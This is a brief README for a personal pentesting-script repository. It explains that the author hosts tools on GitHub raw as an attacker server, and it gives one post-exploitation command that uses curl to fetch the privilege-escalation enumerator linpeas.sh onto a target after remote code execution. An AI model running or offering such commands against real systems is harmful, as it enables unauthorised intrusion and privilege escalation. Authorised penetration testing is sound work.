# Pentest_Script
Some scripts that I find useful in pentesting, and also I use `Github raw` as a attacker server.

e.g. If you have found a RCE vulnerability, you can execute the following code to do privilege escalation

```
curl https://raw.githubusercontent.com/chanbengz/Pentest_Script/main/linpeas.sh
```
